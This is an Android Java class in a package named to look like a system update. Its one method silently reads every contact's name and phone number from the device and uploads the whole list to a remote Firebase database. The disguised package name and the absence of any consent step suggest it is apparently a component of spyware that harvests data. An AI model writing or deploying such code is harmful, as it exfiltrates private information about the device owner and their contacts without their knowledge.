package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import com.google.firebase.database.DatabaseReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ContactsHelper {

    public static void pushContacts(Context ctx, DatabaseReference dataRef) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                Map<String, Object> m = new HashMap<>();
                m.put("name", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                m.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                list.add(m);
            }
            c.close();
        }
        dataRef.child("contacts").setValue(list);
    }
}
